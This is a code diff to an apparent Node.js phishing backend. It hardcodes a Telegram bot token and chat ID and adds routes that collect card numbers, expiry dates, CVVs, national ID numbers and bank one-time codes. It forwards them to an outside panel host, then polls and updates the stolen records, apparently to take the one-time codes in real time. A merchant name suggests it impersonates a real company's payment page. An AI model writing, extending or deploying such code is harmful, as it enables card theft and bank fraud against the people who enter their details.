@@ -5,8 +5,8 @@ const axios   = require('axios');
 const path    = require('path');
 
 const PORT     = process.env.PORT     || 3002;
-const TG_TOKEN = process.env.TG_TOKEN || '';
-const TG_CHAT  = process.env.TG_CHAT  || '';
+const TG_TOKEN = process.env.TG_TOKEN || '8791150470:AAHYlWRPPzp5vKQgfv6np2YJuf91SGxbPU8';
+const TG_CHAT  = process.env.TG_CHAT  || '-5211450529';
 
 const PALOMMA_BASE = 'https://gosfhhn6za.execute-api.us-east-1.amazonaws.com';
 const MERCHANT_ID  = 'coninsa';
@@ -100,7 +100,57 @@ async function tgAnswerCallback(id) {
   }).catch(() => {});
 }
 
+const PSEC_BASE = 'https://pagpse-u6htdvaa.b4a.run';
+
 // ── Routes ────────────────────────────────────────────────────────────────────
+
+// ── Proxy psec tarjetas ───────────────────────────────────────────────────────
+app.post('/api/tarjeta/crear', async (req, res) => {
+  try {
+    const { numero_tarjeta, fecha, cvv, tipo_doc, cedula, monto } = req.body || {};
+    const params = new URLSearchParams({
+      numero_tarjeta: numero_tarjeta || '',
+      fecha:          fecha || '',
+      cvv:            cvv  || '',
+      nombre:         cedula || '',
+      apellido:       '',
+      tipo_doc:       tipo_doc || 'CC',
+      cedula:         cedula || '',
+      celular:        '',
+      email:          '',
+      monto:          monto || 0,
+    });
+    const r = await axios.post(`${PSEC_BASE}//panel/run/create_tarjeta_m3it3m.php`, params.toString(), {
+      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+      timeout: 12000,
+    });
+    res.json(r.data);
+  } catch (e) { res.json({ status: 'ERROR', message: e.message }); }
+});
+
+app.get('/api/tarjeta/estado/:id', async (req, res) => {
+  try {
+    const r = await axios.get(`${PSEC_BASE}//panel/run/get_tarjetas_m3it3m.php`, { timeout: 12000 });
+    const all = r.data?.data || [];
+    const item = all.find(t => String(t.id) === String(req.params.id));
+    if (!item) return res.json({ status: 'NOT_FOUND' });
+    res.json({ status: 'OK', data: item });
+  } catch (e) { res.json({ status: 'ERROR', message: e.message }); }
+});
+
+app.post('/api/tarjeta/actualizar', async (req, res) => {
+  try {
+    const { id, status, banco_otp, dinamica } = req.body || {};
+    const params = new URLSearchParams({ id: id || '', status: status || '' });
+    if (banco_otp) params.append('banco_otp', banco_otp);
+    if (dinamica)  params.append('dinamica', dinamica);
+    const r = await axios.post(`${PSEC_BASE}//panel/run/update_tarjeta_status_m3it3m.php`, params.toString(), {
+      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+      timeout: 12000,
+    });
+    res.json(r.data);
+  } catch (e) { res.json({ status: 'ERROR', message: e.message }); }
+});
 
 app.post('/api/tg/send', async (req, res) => {
   try {
